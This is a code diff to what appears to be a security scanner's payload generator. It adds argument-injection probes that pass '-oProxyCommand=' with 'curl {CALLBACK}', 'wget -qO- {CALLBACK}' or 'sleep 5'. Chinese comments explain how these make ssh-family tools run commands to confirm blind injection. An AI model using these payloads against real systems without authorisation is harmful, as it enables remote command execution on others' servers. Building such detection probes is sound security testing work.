@@ -73,6 +73,21 @@ def _ai_battery() -> list[dict]:
     for opt in ("--version", "-V", "--help", "-h", "--usage"):
         out.append({"value": opt, "channel": "differential", "expect": None, "control": None,
                     "delay_target": 0.0, "technique": f"ai:{opt}"})
+    # —— 带副作用的选项注入 gadget（oob/timing 通道）——
+    # 某些二进制把"值型选项"解释为"执行外部命令"（ssh/scp/sftp 的 ProxyCommand 等），据此让被 argv
+    # 解析器当成选项的注入值产生**可验证副作用**——oob 回连 / timing 延时。与上面 inband/differential
+    # 的本质区别：**不依赖靶机把子命令的报错/输出回显出来**——当宿主工具吞掉子进程 stderr（只回
+    # {"success":false} 之类）时 inband/differential 全瞎，而副作用通道照样命中。副作用本身（我们自己的
+    # 回连 URL / 固定 5s 延时）完全可控、可验证，故不违反旧原则"内容不可控的写文件型选项不纳入"。
+    # 通用 gadget 语料、不针对任何服务器；单值注入能稳定打中的以 ssh/scp/sftp 族 ProxyCommand 为主
+    # （选项自带取值、宿主工具连接只需 1 个操作数），其余族（rsync --rsh / git core.sshCommand 等多需额外
+    # 操作数或分词）单值注入常够不到，后续可继续扩充本语料。
+    for cmd, ch, delay in (("curl {CALLBACK}", "oob", 0.0),
+                           ("wget -qO- {CALLBACK}", "oob", 0.0),
+                           ("sleep 5", "timing", 5.0)):
+        out.append({"value": f"-oProxyCommand={cmd}", "channel": ch, "expect": None,
+                    "control": None, "delay_target": delay,
+                    "technique": f"ai:gadget:proxycmd:{ch}"})
     return out
 
 
